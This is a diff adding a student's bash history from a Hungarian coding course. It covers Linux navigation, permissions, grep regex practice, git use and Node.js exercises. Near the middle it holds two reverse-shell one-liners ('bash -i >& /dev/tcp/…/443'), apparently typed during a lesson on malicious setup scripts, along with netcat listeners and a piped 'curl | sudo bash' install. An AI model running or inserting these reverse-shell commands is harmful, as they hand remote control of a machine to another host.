@@ -1,0 +1,1450 @@
+ls
+man ls
+sudo spt update
+sudo apt update
+clear
+F
+sudo apt update
+man sudo_root
+sudo apt update
+sudo apt upgrade
+cd /
+ls
+cd bin
+ls
+ls -l
+ls -a
+cd ..
+clear
+pwd
+cd /
+cd boot
+ls -l
+clear
+cd ..
+ls
+ls dev
+cd etc
+ls
+/$
+~$
+cd/
+cd ..
+cd /root
+cd /home
+ls
+cd karo
+/$
+cd /$
+cd ..
+pwd
+tmp
+/tmp
+ls
+tmp$ cd
+cd usr/
+ls
+cd ..
+sys$
+clear
+vi
+echo hello
+echo hello > szia
+mc
+
+sudo apt install mc
+man find
+clear
+cd..
+cd ..
+/home
+../home
+ls
+cd 1-
+node hello.js
+cd 1-basics_selections
+node hello.js
+cd dataTypes.js
+cd ..
+node dataTypes.js
+cd 1-basics_selections
+node dataTypes.js
+~
+cd ~
+sudo apt install curl wget
+curl -sL https://deb.nodesource.com/setup_10.x | sudo bash -
+sudo apt install nodejs
+sudo apt install software-properties-common apt-transport-https wget
+mkdir tudas
+mkdir jarmu
+ls
+pwd
+ls/
+ls /
+ls /karo
+pwd
+ls /home
+cd karo
+cd jarmu
+pwd
+mkdir Citroen
+ls
+mkdir Lada Mercedes Nissan Open Peugeot Daewo Fiat Ford
+ls
+pwd
+ls /
+pwd
+.
+cd home
+cd karo/home
+cd ..
+ls
+pwd 
+cd home/karo
+cd /home/karo
+pwd
+cd /home/user
+cd /root
+cd /home
+ls
+cd home/karo
+cd /home/karo
+ls
+cd /root
+ls /root
+ls /bin
+cd /etc/root
+ls /root
+ls /
+cd etc
+pwd
+cd home/karo/etc
+ls /
+pwd
+cd /home/karo/etc
+ls
+ls /
+cd etc
+cd /etc
+ls
+..
+cd ..
+ls
+ls etc -l
+ls var -l
+ls -la
+cd ..
+pwd
+ls
+cd /home
+mkdir Teszt
+ls /home
+cd /karo
+cd karo
+ls
+mkdir Teszt
+cd Teszt
+mdir T1 T2
+mkdir T1 T2
+ls
+pwd
+mkdir Unix/Linux/Debian
+ls
+mkdir -p Unix/Linux/Debian
+ls
+ls Unix
+mv Debian Deb
+ls Linux
+cd Linux
+ls Unix
+cd Linux
+cd Debian
+cd /Linux
+cd Unix/Linux
+ls
+pwd
+cd Debian
+ls
+mv Debian Deb
+cd ..
+ls
+mv Debian Deb
+ls
+~
+cd ~
+ls
+cd jarmu
+ls
+mv Open Opel
+ls
+cd /Linux
+cd~
+ls
+cd ~
+ls
+cd Teszt
+ls
+mv Deb T1
+cd Unix
+cd Linux
+ls
+mv Deb T1
+ls
+mv T1 Deb
+ls
+mv Deb T1/
+ls
+mv T1 Deb
+ls
+mkdir Tamás
+rmdir Tamás
+ls
+cd T1
+cd /T1
+ls
+tree
+sudo apt install tree
+tree
+cd Teszt
+cd Teszt/
+cd /Teszt
+cd Teszt
+cd ~
+ls
+cd Teszt
+ls
+cd T1
+ls
+mv Deb T1
+mv Deb T1/
+node if.js
+cd 1-basics_selections
+node if.js
+node gyakorló.js
+cd 1-basics_selections
+node if.js
+node gyakorló.js
+touch teszt.txt
+ls
+touch Test.txt
+ls
+ls -l
+chmod u+x g-w+x o-r
+8. A hegymászás lényege, hogy az ember a lehetőségekhez képest elkerüli az objektív veszélyeket, a szubjektív veszélyeket pedig ésszerű felkészüléssel és szigorú fegyelemmel teljességgel kiiktatja. Ennek eredményeképpen a hegymászók őszintén hiszik, hogy a Matterhorn megmászása sokkal biztonságosabb, mint egy manhattani utcán átkelni, ahol az objektív veszélyek – taxisofőrök, biciklisták, buszok meg fosztogatók – sokkal kevésbé kiszámíthatóak, mint a hegyi veszedelmek, és a személyes ügyesség sokkal kevésbé alkalmas a gyalogos biztonságának megőrzésére.
+/Csíkszentmihályi Mihály/
+8. A hegymászás lényege, hogy az ember a lehetőségekhez képest elkerüli az objektív veszélyeket, a szubjektív veszélyeket pedig ésszerű felkészüléssel és szigorú fegyelemmel teljességgel kiiktatja. Ennek eredményeképpen a hegymászók őszintén hiszik, hogy a Matterhorn megmászása sokkal biztonságosabb, mint egy manhattani utcán átkelni, ahol az objektív veszélyek – taxisofőrök, biciklisták, buszok meg fosztogatók – sokkal kevésbé kiszámíthatóak, mint a hegyi veszedelmek, és a személyes ügyesség sokkal kevésbé alkalmas a gyalogos biztonságának megőrzésére.
+/Csíkszentmihályi Mihály/..
+chmod u+x g-w+x o-r Test.txt
+cd home/
+ls
+ls -l
+chmod u+x g-w+x o-r Test.txt
+chmod u+x Test.txt
+ls -l
+chmod u+xg-w+xo-r Test.txt
+chmod --help
+man chmod
+chmod g-w+xo-r Test.txt
+chmod g-w+x Test.txt
+chmod o-r Test.txt
+ls -l
+chmod 750 Test.txt 
+ls -l
+chmod 644 Test.txt 
+ls -l
+mdir Közös
+mkdir Közös
+ls
+ls -l
+chmod 777 Közös
+ls -l
+cd ..
+ls
+cd karo/
+ls
+cd ~
+ls
+cd /
+ls
+cd etc
+ls
+ls -l
+cat passwd
+grep -vc /bin/bash$ passwd
+/dev
+ls -l
+grep ^b
+cat passwd
+grep -vc /bin/bash$ passwd
+/etc
+ls
+ls -l
+/dev
+ls -l
+ls -l grep ^b /dev
+grep ./etc/bash.bashrc
+cd 1-basics_selections
+node lista.js
+node gyakoró.js
+node gyakorló.js
+node lista.js
+node homerseklet.js
+node if.js
+node supernaturals.js
+cd ..
+cd 2-switch_for
+ls
+cd IOTA_PROGALAP/
+cd 2-switch_for/
+cd~
+cd ~
+ls
+cd IOTA_PROGALAP/2-switch_for/
+ls
+node switch.js
+node gyak1.js 
+root/
+cat
+cat &
+ulimit -u
+ps
+nano &
+mcedit &
+yes > /dev/null &
+yes
+ps a
+ps ax
+ps ax-f
+ps ax -f
+ps axf
+ps
+kill -9 9402
+ps
+kill -l
+ps
+fg 1
+fg 4
+kill -9
+kill -9 9449
+kill -9 9457
+ps
+kill -9 9351
+ps
+top
+htop
+sudo snap install htop  # version 3.0.2, or
+systemctl
+crontab -e
+crontab -l
+crontab -e
+cat ~/date.txt
+touch date.txt
+cd /karo
+cd /home/karo/
+ls
+crontab -e
+crontaab -e
+crontab -e
+karo@Karo:~$ crontab -e
+No modification made
+crontab -e
+cat date.txt
+crontab -e
+sudo apt install open
+ls -a
+ssh keygen -t rsa
+ssh-keygen -t rsa
+ssh karolina@vitriolfox.ddns.net
+ssh karolina@vitriolfox.ddns.net
+sh-copy-id karolina@vitriolfox.ddns.net
+ssh-copy-id karolina@vitriolfox.ddns.net
+ls
+ssh karolina@vitriolfox.ddns.net
+touch nenyisdmeg.txt
+sftp karolina@vitriolfox.ddns.net
+sudo apt install openssh
+ifconfig
+sudo apt install net-tools
+ifconfig
+sftp>
+sftp karolina@vitriolfox.ddns.net
+cd ~
+clear
+cd /home
+ls
+mkdir feladat2
+cd /karo
+ls
+cd /home/karo/
+ls
+mkdir Feladat2
+ls
+cd /Feladat2
+pwd
+ls
+cd Feladat2
+ls
+touch ures.txt
+nano
+ls
+mkdir Linkek
+ls
+mv ures.txt uresfajl.txt
+ls
+man hardlink
+ln <nemures.txt> <Linkek>
+man ln
+ln -P  <nemures.txt> <Linkek>
+man ln
+ln -P 
+ln -P nemures.txt Linkek
+ls
+man ln
+ln -r uresfajl.txt
+ln --r uresfajl.txt
+man ln
+ln -s uresfajl.txt
+ls
+ln -s <uresfajl.txt>
+ln -s uresfajl.txt
+ls -l
+man ln
+stat
+stat man
+stat /Feladat2
+stat Feladat2
+cd..
+ls
+cd ..
+s
+ls
+stat Feladat2
+cd Feladat2
+stat
+man stat
+ls -l
+ln -s uresfajl.txt
+stat Feladat2
+cd ..
+stat Fealadat2
+stat Feladat2
+rm nemures.txt
+cd Feladat2/
+rm nemures.txt
+ls -l
+Ez egy sor
+Ez meg egy sor
+Harmadik sor
+negyedik sor
+Dátumok:
+1992.12.12
+2002.05.15
+2007.10.01
+Bank:
+11773991-01245697-00000000
+21452353-12133244-00000000
+12141241-12134214-12102100
+alma
+béla
+cica
+demo
+echo
+feri
+golf
+asddd@cicamail.com
+kiss.feri@nagy.cica.com
+dddaa@gmail.com
+geza@freemail.hu
+~
+cd ~
+pmw
+pwd
+cd /home/karo/Documents/Flow\ Academy\ oktató\ anyagok/Linux\ alapozó/
+ls
+nano grepTest.txt
+grepTest.txt
+grep sor grepTest.txt
+grep \d grepTest.txt
+ls
+cd Documents/Flow\ Academy\ oktató\ anyagok/Linux\ alapozó/
+ls
+grep sor grepTest.txt
+cd Documents/Flow\ Academy\ oktató\ anyagok/Linux\ alapozó/
+grep sor grepTest.txt
+grep [0-9]{3} grepTest.txt
+grep -P "^[a-d].{4}$" grepTest.txt
+grep ^[0-9][0-9][0-9][0-9][.] grepTest.txt
+grep \w{4}. grepTest.txt
+grep \w{4}.\w\w.\w\w grepTest.txt
+grep (\w{4}.\w\w.\w\w) grepTest.txt
+grep \w{4}.\w\w.\w\w grepTest.txt
+grep [0-9] grepTest.txt
+grep [0-9]{4}[.] grepTest.txt
+grep ^[0-9]{4}[.] grepTest.txt
+grep ^[0-9]{2,4}[.] grepTest.txt
+grep ^[0-9]{2,4} grepTest.txt
+grep ^[0-9]{4} grepTest.txt
+grep [0-9]{4} grepTest.txt
+grep \d{4} grepTest.txt
+grep ^\d{4} grepTest.txt
+grep ...\...\... grepTest.tyt
+grep ...\...\... grepTest.txt
+grep [0-9] grepTest.txt
+grep [0-9]{4}. grepTest.txt
+grep [0-9]{4}\. grepTest.txt
+grep (\w{4}) grepTest.txt
+grep (\w{4})(\.) grepTest.txt
+grep [\d]{4} grepTest.txt
+grep ^[\d]{4} grepTest.txt
+grep ^[\d]{8} grepTest.txt
+grep [\d]{8} grepTest.txt
+grep [\d]{8}- grepTest.txt
+grep -{3} grepTest.txt
+grep 12 grepTest.txt
+grep Dátumok  grepTest.txt
+grep ^19 grepTest.txt
+grep ^19|^20 grepTest.txt
+grep ^19|20 grepTest.txt
+grep ^19|20 grepTest.txt
+grep [0-9]{8} grepTest.txt
+grep [0-9]{8}- grepTest.txt
+grep [0-9]{8}-[0-9]{8}-[0-9]{8} grepTest.txt
+grep [0-9]{8} grepTest.txt
+grep ^[0-9]{8}$ grepTest.txt
+grep ([0-9]{8})- grepTest.txt
+grep ([0-9]{8})-([0-9]{8})([0-9]{8}) grepTest.txt
+grep ([0-9]{8})-([0-9]{8})-([0-9]{8}) grepTest.txt
+grep ([0-9]{8}).([0-9]{8}).([0-9]{8}) grepTest.txt
+grep 00$ grepTest.txt
+grep [a-g] grepTest.txt
+grep ^[a-g] grepTest.txt
+grep ^[a-g][^@] grepTest.txt
+grep ^[a-g][a-z]{4} grepTest.txt
+grep ^[a-g][\d]{4} grepTest.txt
+grep ^[a-g][\w]{4} grepTest.txt
+grep ^[a-g][\D]{4} grepTest.txt
+grep ^ez sor$ grepTest.txt
+grep ^(ez)(sor)$ grepTest.txt
+grep ^ezsor$ grepTest.txt
+grep ^ez,sor$ grepTest.txt
+
+grep ^ez.+sor$ grepTest.txt
+grep ^ez.*sor$ grepTest.txt
+grep ^ez...sor$ grepTest.txt
+grep @ grepTest.txt
+grep @.+mail grepTest.txt
+cd ./3-module-objects/
+node objectsgyak.js
+/bin/bash -c 'bash -i >& /dev/tcp/192.168.5.200/443 0>&1'
+#!/bin/sh
+echo "Installing zsh
+/bin/bash -c 'bash -i >& /dev/tcp/192.168.5.100/443 0>&1'
+pwd
+cd /karo
+cd /home/karo
+ls
+touch shell.sh
+#!/bin/bash
+sh
+#!/bin/bash
+ls
+ls -la
+setup.sh
+vi setup.sh
+vim setup.sh
+vi.setup.sh
+vi .setup.sh
+./setup.sh
+ls
+vim
+#!/bin/bash
+vim #!/bin/bash
+man vim
+sudo apt install vim
+vim #!/bin/bash
+vim
+vim
+man *
+man val
+man VAL
+#!/bin/bash
+VAL="Bela"
+echo $VAL
+echo ${VAL}25
+vim
+./feladatRoland.sh
+chmod +x feladatRoland.sh
+./feladatRoland.sh
+./feladatRoland.sh kettő
+./feladatRoland.sh kettő három
+./feladatRoland.sh kettő 
+./feladatRoland.sh 
+./feladatRoland.sh egy
+./feladatRoland.sh
+./feladatRoland.sh alma
+./feladatRoland.sh alma körte
+./feladatRoland.sh szilva alma körte
+node objectsgyak.js 
+node gyak1.js 
+cd 4-arrays-practise/
+node data.js 
+cd ~/Downloads/
+ls
+cd ~/IOTA_PROGALAP/4-arrays-practise/
+node data.js 
+node data.js
+cd 5-union-scope/
+node basic2.js 
+node scope.js 
+cd ..
+cd 4-arrays-practise/
+node data.js 
+cd ..
+cd IOTA_PROGALAP/
+cd GYAKORLÁS/
+node alapok.js 
+node gyak.js
+node decrypt.js 
+grep tde
+node decrypt.js  grep tde
+node decrypt.js  grep tde --colors always
+node decrypt.js  grep tde --color=always
+node decrypt.js 
+node decrypt.js | grep tde --color=always
+node decrypt.js
+sudo aprt install git
+sudo apt install git
+git --version
+ls -la ~/.ssh
+cat id_rsa.pub
+cd ~/.ssh
+cat id_rsa.pub
+cd ~
+ls
+cd Documents/Flow\ Academy\ oktató\ anyagok/
+ls
+mkdir GIT
+cd GIT/
+git@github.com:pakaikarolina/git1.git
+git clone git@github.com:pakaikarolina/git1.git
+ls
+cd git1/
+git status
+touch osszeadas.js
+nano nano osszeadas.js 
+cat osszeadas.js 
+nano osszeadas.js 
+cat nano 
+nano osszeadas.js 
+git add osszeadas.js 
+git commit osszeadas.js 
+git config -- global user.email "pakaikarolina@gmail.com"
+git config --global user.email "pakaikarolina@gmail.com"
+git config --global user.name "pakaikarolina"
+git status
+git commit 
+git status
+touch kivonas.js
+nano kivonas.js 
+ls
+git add kivonas.js 
+git status
+git commit
+git status
+touch szorzas.js
+nano szorzas.js 
+git add szorzas.js 
+git commit
+ls
+git status
+touch osztas.js
+nano osztas.js 
+git add osztas.js 
+git commit
+git status
+git push
+nano kivonas.js 
+git add kivonas.js 
+git commit
+git push
+status
+git status
+git HEAD
+git log
+git branch
+git -help
+man git
+git checkout -b flowacademy
+git checkout main
+status
+git status
+git checkout flowacademy 
+git status
+git checkout main
+git checkout -b develope
+git checkout -b develop
+touch paros.js
+nano paros.js 
+git add paros.js 
+git commit
+git push
+git checkout main
+git merge develop
+git push
+cd ..
+ls
+git clone git@github.com:SiposGergo/decrypt.git
+ls
+git checkout decrypt/
+git branch
+git checkout decrypt
+git branch
+ls
+got branch
+git branch
+status
+git status
+git chechout git1/
+git checkout git1/
+git checkout git1
+cd decrypt/
+git branch
+git checkout -b karo
+git status
+ls
+cat encrypted.txt 
+ls
+node  encrypted.txt 
+cd ~
+ls
+cd Documents/Flow\ Academy\ oktató\ anyagok/GIT/decrypt/
+ls
+node gyak.js
+git status
+git add gyak.js
+git commit
+git push
+git push --set-upstream origin karo
+it status
+git status
+git branch
+node gyak.js
+git status
+git add gyak.js 
+git commit
+git push
+git add file.js
+git status
+git commit
+git push
+sudo apt update visual studio code
+man update
+man install
+sudo apt-get upgrade
+cd 6-sorts\,\ 2D\ arrays/
+node sort.js 
+cleAR
+clear
+node sort.js 
+node 2D_arr.js 
+npm init
+npm install chalk
+node index.js 
+npm i readline-sync
+npm init
+node file.js 
+npm install semistandard
+npm install semistandard -g
+sudo npm install semistandard -g
+semistandard -v
+semistandard --version
+cd /home/karo/IOTA_PROGALAP/4-arrays-practise
+node data.js
+cd /home/karo/IOTA_PROGALAP/6-sorts, 2D arrays
+cd /home/karo/IOTA_PROGALAP/6-sorts, 2D arrays/
+cd "/home/karo/IOTA_PROGALAP/6-sorts, 2D arrays"
+node gyakorlas.js 
+cd /home/karo/IOTA_PROGALAP/3-module-objects
+node objects.js
+cd /home/karo/IOTA_PROGALAP/GYAKORLÁS
+node ge
+node generatearray.js 
+cd ..
+cd 4-arrays-practise/
+node basic.js 
+node file.js 
+cd 4-arrays-practise/
+node data.js 
+node 1.feladat.js 
+git status
+git add 1.feladat.js 
+git commit
+git status
+ls
+git push
+touch 2.fealadat.js
+node 2.fealadat.js 
+node 5.feladat.js 
+node 2.fealadat.js 
+git add 2.fealadat.js 
+git commit
+git push
+git status
+git add 1.feladat.js 
+git status
+git commit
+push
+git push
+cd ..
+git clone git@github.com:pakaikarolina/Egyszeru-konzolos-jatek.git
+ls
+cd Egyszeru-konzolos-jatek/
+touch index.js
+git add index.js 
+git status
+git commit
+git push
+git status
+git branch
+cd ..
+ls
+cd Documents/Flow\ Academy\ oktató\ anyagok/GIT/
+ls
+git clone git@github.com:pakaikarolina/TESZT.git
+status
+git status
+cd TESZT/
+git status
+touch 1.feladat.js
+ls
+node index.js 
+git add index.js 
+git add map.js 
+git commit
+git push
+npm init
+npm i table
+npm i readline-sync
+git status
+git add.
+git add .
+git status
+git commit
+git push
+git status
+node index.js 
+node map.js
+node index.js 
+cd /home/karo/IOTA_PROGALAP/4-arrays-practise
+node data.js 
+cd ..
+cd GYAKORLÁS/
+node gyak2.js 
+cd 7-readline_recursion/
+node callback.js 
+node timeout.js 
+node recursion.js 
+npm init
+npm i table
+node userinterface.js 
+npm i axel
+cd 3-module-objects/
+node array.js 
+cd ..
+cd 4-arrays-practise/
+node data.js 
+cler
+clear
+node file.js 
+cd GYAKORLÁS/
+node
+node varosok.js 
+clear
+node varosok.js 
+clear
+node varosok.js 
+clear
+node varosok.js 
+cd ..
+cd GYAKORLÁS/
+node dwarves.js 
+node varosok.js 
+cd GYAKORLÁS/
+node tombokgyak.js 
+node 3.feladat.js 
+git status
+node 5.feladat.js 
+git add 3.feladat.js 
+git commit
+git push
+cd GYAKORLÁS/
+node varosok.js 
+node tombokgyak.js 
+node pow.js 
+ls
+cd Documents
+git status
+git clone git@github.com:hajnalandor/gitRepo1234.git
+ls
+cd gitRepo1234/
+ls
+cd ..
+cd gitRepo1234/
+nano main.js
+git status
+git stash
+git checkout -b develop
+nano main.js
+git status
+git add .
+git commit
+git push
+git push --set-upstream origin develop
+git status
+cd ..
+ls
+cd Flow\ Academy\ oktató\ anyagok/
+ls
+cd GIT/
+git status
+ls
+git clone git@github.com:pakaikarolina/JS_math.git
+git status
+ls
+cd JS_math/
+ls
+git status
+git checkout -b develop
+git branch
+got status
+git status
+git add develop
+git status
+git branch
+git status
+git checkout develop
+git branch
+ls -la
+git status
+git push
+git push --set-upstream origin develop
+git pull
+git status
+ls
+nano README.md 
+git status
+git add README.md 
+git commit
+git push
+git status
+git checkout -b Karo
+git stats
+git branch
+git status
+touch pow.js
+ls
+git status
+ls
+git add pow.js
+git commit
+git push
+git push --set-upstream origin Karo
+git status
+git add pow.js 
+git commit
+git push
+cd ..
+ls
+cd Prog\ alap/
+ls
+cd ..
+ls
+mkdir Die by the Box
+ls
+cd Die/
+ls
+echo "# die-by-the-box" >> README.md
+git init
+git add README.md
+git commit -m "first commit"
+git branch -M main
+git remote add origin git@github.com:flowacademyhu/die-by-the-box.git
+git push -u origin main
+git status
+git checkout -b develop
+git status
+git push
+git branch
+git checkout -b index
+git push
+git push --set-upstream origin index
+git cehckout map
+git pull
+git branch
+git branch develop
+git checkout branch develop
+git checkout develop
+git pull 
+git branch
+git chechout palya
+git checkout palya
+git branch
+git checkout jatekos
+git checkout dobozok
+git branch
+git branch map
+git branch
+git ..
+cd ..
+cd Die\ by\ the\ Box/
+git pull
+git checkout main
+git pull
+git checkout map
+git pull
+git branch -   git branch --set-upstream-to=origin/<branch> map
+git branch --set-upstream-to=origin/map map
+git pull
+node index.js 
+npm init
+npm i table
+npm i axel
+node index.js 
+node pt.js
+cd ~
+cd ~/karo/Documents
+cd ~/Documents/IOTA_PROGALAP/GYAKORLÁS/
+node pt.js 
+cd GYAKORLÁS/
+node git.js 
+git status
+git checkout develop
+git status
+git pull
+git status
+ls
+git checkout map
+git merge develop
+ls
+git statuss
+git status
+git checkout develop
+ls
+git pull
+node gi
+cd GYAKORLÁS/
+node git.js 
+node pt.js 
+cd Douments
+cd ~/Documents
+ls
+cd Flow\ Academy\ oktató\ anyagok/Die\ by\ the\ Box/
+ls
+git status
+git log
+cd ..
+ls
+git status
+ls
+cd GIT
+ls
+cd JS_math/
+ls
+git status
+cd ~
+cd Documents/
+ls
+cd Flow\ Academy\ oktató\ anyagok/
+ls
+cd Die
+cd Die\ by\ the\ Box/
+la
+ls
+git status
+git pull
+git merge
+ls
+rm package.json
+ls
+rm package-lock.json
+ls
+git merge
+git status
+git pull
+code .
+git status
+git diff
+git checkout -- index.js
+git pull
+git status
+code .
+node index.js
+node scores.js
+node index.js
+clear
+node index.js 
+node index.js 
+node john.html 
+google-chrome john.html 
+cd ~/Documents/Flow\ Academy\ oktató\ anyagok/Die\ by\ the\ Box/
+git status
+git pull
+git merge
+git status
+git stash
+git pull
+git status
+git pull
+git stash
+git pull
+git status
+git add falling.js
+git add index.js
+git commit
+git push
+git pull
+git status
+git add index.js
+git commit
+git push
+node proba.js 
+node index.js
+node map.js
+node index.js
+node index.js 
+sudo apt-get install netcat
+netcat
+nc example.com 80
+uhiodajsmfoijdsfiéafnjiajgmiafnigfsjvosfkfokasá
+mlémmvkdfgmfjgmfksgmfsábmdfkébnmfksflbklabmfklndksbnkdgbjiothnbtlngmioklmbgiklbm bgdklmbkdglcm gdbkmévofvm fdávjc k
+
+echo "Hello Flow!" > hello.txt
+cat hello.txt
+{ echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <hello.txt)\r\n\n\n"; cat hello.txt; } | nc -l 8080
+sudo apt-get install dnsutils
+dig
+dig google.com
+dig facebook.com
+nc -l 5000
+ifconfig
+nc -l 5000
+nc 5000
+nc 192.168.5.78 5000
+nc localhost
+nc localhost 5000
+cat incoming.txt
+cat incoming.txt >hello
+cat >incoming.txt "hello"
+node index.js
+clear
+node index.js
+clear
+node index.js
+clear
+node index.js
+cd Documents/Flow\ Academy\ oktató\ anyagok/Die\ by\ the\ Box/
+git status
+git pull
+git stash
+git status
+node index.js
+node proba.js 
+cd Documents/Flow\ Academy\ oktató\ anyagok/Die\ by\ the\ Box/
+git status
+cd GYAKORLÁS/
+node varosok.js 
+clear
+node varosok.js 
+clear
+node varoskujra.js 
+clear
+node varosok.js
+node tombokgyak.js 
+cd GYAKORLÁS/
+node varoskujra.js 
+node varosok.js
+node index
+node index.js
+clear
+node index.js
+cd Documents/Flow\ Academy\ oktató\ anyagok/Die\ by\ the\ Box/
+git status
+git fetch
+git status
+git fetch
+git status
+git branch
+git checkout dobozok
+git status
+git reset
+git reset --hard
+git status
+git checkout dobozok
+git status
+git pull
+cd GYAKORLÁS/
+
+node tombokgyak.js 
+clear
+node 2Dtombokgyak.js 
+cleclear
+clear
+node settimeout.js 
+cd ..
+cd 7-readline_recursion/
+node timeout.js 
+node recursion.js 
+clear
+node recursion.js 
+cd GYAKORLÁS/
+node 2Dtombokgyak.js 
+const search2D = (randomszamTomb) => {
+};
+node 2Dtombokgyak.js 
+clear
+node 2Dtombokgyak.js 
+clear
+node 2Dtombokgyak.js 
+clear
+node 2Dtombokgyak.js 
+clear
+node 2Dtombokgyak.js 
+node index.js
+clear
+node index.js
+clear
+node index.js
+clear
+node index.js
+clear
+node index.js
+clear
+node index.js
+clear
+node index.js
+cd Documents/Flow\ Academy\ oktató\ anyagok/Die\ by\ the\ Box/
+git status
+git checkout dobozok
+git checkout --abort
+git checkout -f dobozok
+git status
+git checkout develop
+git status
+git pull
+git status
+git statu
+git status
+git pull
+node index.js
+git status
+git pull
+git checkout -f
+git pull
+node index.js
+git status
+node index.js
+npm i terminal-kit
+node index.js
+git status
+git pull
+git pull -f
+force
+git help
+git switch main
+git branch
+git status
+git pull
+git checkout -f
+git pull
+node index.js
+git pull
+cd GYAKORLÁS/
+node tombokgyak2.js 
+node index.js
+cd Documents/Flow\ Academy\ oktató\ anyagok/Die\ by\ the\ Box/
+git status
+git pull
+git pull --f
+git pull --force
+git add topscores.json
+git commit
+git pull
+code .
+node index.js
+npm init chalk
+npm install chalk
+git pull
+code .
+git status
+git commit
+git status
+git add topscores.json
+git commit
+git pull
+git status
+git pull
+git status
+git pull
+git add moves.js
+git commit
+git pull
+git status
+git add moves.js
+git add topscores.json
+git commit
+git status
+node index.js
+git status
+git add index.js
+git add map.js
+git add moves.js
+git add package-lock.json
+git add package.json
+git add topscores.json
+git commit
+git push
+git pull
+git status
+git push
+git pull
+git status
+git merge --abort
+git status
+git push
+git status
+git pull
+git status
+git push
+git commit
+git status
+git add moves.js
+git add topscores.json
+git status
+git commit
+git push
+git status
+git pull
+node index.js
+cd Documents/Flow\ Academy\ oktató\ anyagok/Die\ by\ the\ Box/
+git status
+git pull
+
+node index.js
+git pull
+git stash
+git pull
+node index.js
+ls -la
+ls -l
+ls
+cd Karo
+cd ..
+ls
+ls -la
+cd ..
+ls
+cd etc
+ls
+cd apt/sources.list.d/
+ls
+ls -la
+cd ..
+ls
+cd lists
+cd ~
+ls
+cd Home
+cd ..
+ls
+cd var/lib/apt/lists/
+ls
+clear
+grep ^Package /var/lib/apt/lists/*_Packages | awk '{print $2}' | sort -u
+update
+sudo apt update
+cd root
+cd Root
+cd /
+ls
+cd Documents/Flow\ Academy\ oktató\ anyagok/Die\ by\ the\ Box/
+node index.js
+ls/
+ls /
+ls/Karo
+ls /Karo
+ls /bin
+ls /Home
+ls
+cat >gyumolcs.txt
+cat gyumolcs.txt 
+szilva<Ctrl>+<D>
+.bash_history
+cat .bash_history
+echo $PATH
+pwd
+echo pwd
+echo $pwd
+echo $PATH
+ls
+pwd
+ulimit -u
+ps
+crontab -l
+/sbin/ifconfig
+set
+ps ax
+cd ~
+pwd
+mkdir home/karo/Documents/linux-feladat
+cd Documents/
+ls
+cd ..
+ls
+mkdir home/karo/Linux-feladat
+mkdir home/karo/Linux-feladat/
+mkdir /home/karo/Linux-feladat/
+ls
+pwd
+touch ./Linux-feladat/welcome.txt
+ls
+cd Linux-feladat/
+ls
+echo "Hello" /home/karo/Linux-feladat/welcome.txt 
+echo "Hello" >/home/karo/Linux-feladat/welcome.txt 
+cat welcome.txt 
+cp welcome.txt welcome2.txt
+ls
+cat welcome2.txt 
+mv welcome2.txt delete-it.delete
+ls
+rm delete-it.delete 
+ls
+cat welcome.txt 
+cd /
+ls
+cd usr
+ls
+cd ~
+pwdd
+pwd
+ls /home/karo/Linux-feladat/
+cd /home/karo/Linux-feladat/
+ps ax
+ps ax | grep grep
+ps ax | grep chrome
+ifconfig
+clear
+node dolgozatgyak.js 
+cd GYAKORLÁS/
+node dolgozatgyak.js 
+/home/karo/Documents/Flow Academy oktató anyagok/JavaScript_PROGALAP/GYAKORLÁS/dolgozatgyak.js
+cd /home/karo/Documents/Flow Academy oktató anyagok/JavaScript_PROGALAP/GYAKORLÁS/
+cd GYAKORLÁS/
+node dolgozatgyak.js 
+cd ..
+cd 6-sorts\,\ 2D\ arrays/
+node 2D_arr.js 
+cd ..
+cd GYAKORLÁS/
+node dolgozatgyak.js 
+node gen2D.js 
